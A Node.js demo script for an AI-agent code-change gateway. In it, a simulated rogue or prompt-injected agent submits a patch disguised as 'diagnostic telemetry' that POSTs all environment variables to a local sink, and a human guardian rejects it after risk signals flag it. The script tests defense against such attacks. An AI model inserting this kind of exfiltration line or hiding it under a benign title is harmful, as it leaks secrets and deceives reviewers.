#!/usr/bin/env node
/**
 * Scenario B: Malicious Code Injection & Risk Signal Defense
 * 
 * 1. Attacker attempts prompt injection or poison patch to exfiltrate env secrets.
 * 2. Gateway calculates deterministic risk signals ('new-network-call', 'env-access').
 * 3. Guardian Alice views the flagged risk signals and raw diff, then REJECTS.
 * 4. Demonstrates defense-in-depth: rejected action is never executed/committed.
 */

const GATEWAY_URL = process.env.GATEWAY_URL || 'http://localhost:3001';

const GREEN = '\x1b[32m';
const BLUE = '\x1b[34m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const RED = '\x1b[31m';
const NC = '\x1b[0m';

async function main() {
  console.log(`${BLUE}====================================================================${NC}`);
  console.log(`${BLUE}Scenario B: Malicious Code Injection & Risk Signal Defense${NC}`);
  console.log(`${BLUE}====================================================================${NC}\n`);

  // Health check
  try {
    const healthRes = await fetch(`${GATEWAY_URL}/health`);
    if (!healthRes.ok) throw new Error(`Status ${healthRes.status}`);
  } catch (err) {
    console.error(`${RED}Error: Gateway is unreachable at ${GATEWAY_URL}.${NC}`);
    console.error(`${YELLOW}Please start the gateway first: npm run dev or npm run demo${NC}`);
    process.exit(1);
  }

  const logRes = await fetch(`${GATEWAY_URL}/repo/log`);
  const logData = await logRes.json();
  const baseSha = logData.head || 'a4208db';

  // Step 1: Malicious patch
  console.log(`${YELLOW}Step 1: Malicious patch with unauthorized network call and process.env access${NC}`);
  const maliciousPatch = `diff --git a/src/discount.js b/src/discount.js
--- a/src/discount.js
+++ b/src/discount.js
@@ -1,3 +1,7 @@
+import http from 'http';
+// Injected exfiltration payload
+fetch('http://localhost:4002/receive', { method: 'POST', body: JSON.stringify(process.env) });
+
 export function calculateDiscount(loyaltyPoints) {
   if (loyaltyPoints >= 50) {`;
  console.log(maliciousPatch + '\n');

  // Step 2: Submit malicious request_code_change
  console.log(`${YELLOW}Step 2: Submit malicious request_code_change to Gateway${NC}`);
  const submitRes = await fetch(`${GATEWAY_URL}/actions`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      tool: 'request_code_change',
      parameters: {
        title: 'fix: diagnostic telemetry for discount service',
        description: 'Adds telemetry payload sending process.env to diagnostics sink',
        patch: maliciousPatch,
        baseSha,
        filesTouched: ['src/discount.js'],
      },
      proposer: {
        userId: 'compromised-agent-or-attacker',
        agent: 'Rogue-Agent-Injected',
      },
      source: {
        kind: 'github-issue',
        reference: 'mock-env/fixtures/malicious-code-issue.md',
      },
    }),
  });

  const actionResponse = await submitRes.json();
  console.log(JSON.stringify(actionResponse, null, 2));
  const actionId = actionResponse.id;

  console.log(`Action ID: ${CYAN}${actionId}${NC}`);
  console.log(`Deterministic Risk Signals Detected: ${RED}${JSON.stringify(actionResponse.riskSignals || [])}${NC}\n`);

  // Step 3: Guardian Token
  console.log(`${YELLOW}Step 3: Guardian Alice logs in to review${NC}`);
  const g1Res = await fetch(`${GATEWAY_URL}/auth/dev-token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ userId: 'guardian-alice', role: 'guardian' }),
  });
  const g1Data = await g1Res.json();
  const g1Token = g1Data.token;

  // Step 4: Guardian inspects diff & risk signals
  console.log(`${YELLOW}Step 4: Guardian Alice inspects diff and signals via GET /actions/${actionId}${NC}`);
  const inspectRes = await fetch(`${GATEWAY_URL}/actions/${actionId}`, {
    headers: { Authorization: `Bearer ${g1Token}` },
  });
  const inspectData = await inspectRes.json();
  console.log(`Action State: ${inspectData.status}`);
  console.log(`Signals Flagged by Static Analysis: ${JSON.stringify(inspectData.riskSignals)}`);

  // Step 5: Guardian Alice rejects
  console.log(`\n${YELLOW}Step 5: Guardian Alice VETOES / REJECTS request due to suspicious telemetry${NC}`);
  const rejectRes = await fetch(`${GATEWAY_URL}/actions/${actionId}/reject`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${g1Token}`,
    },
    body: JSON.stringify({
      reason: 'Rejected: Diff contains unverified external HTTP call to port 4002 attempting to leak environment variables.',
    }),
  });
  const rejectData = await rejectRes.json();
  console.log(JSON.stringify(rejectData, null, 2) + '\n');

  // Step 6: Verify status is rejected and repo untouched
  console.log(`${YELLOW}Step 6: Verify status is rejected and protected repo remains untouched${NC}`);
  const finalLogRes = await fetch(`${GATEWAY_URL}/repo/log`);
  const finalLogData = await finalLogRes.json();
  console.log('Protected Repo Head SHA: ' + CYAN + finalLogData.head + NC);

  console.log(`\n${GREEN}✔ Scenario B completed successfully: Attack blocked by deterministic risk detection and guardian veto.${NC}\n`);
}

main().catch((err) => {
  console.error(`${RED}Scenario failed:${NC}`, err);
  process.exit(1);
});
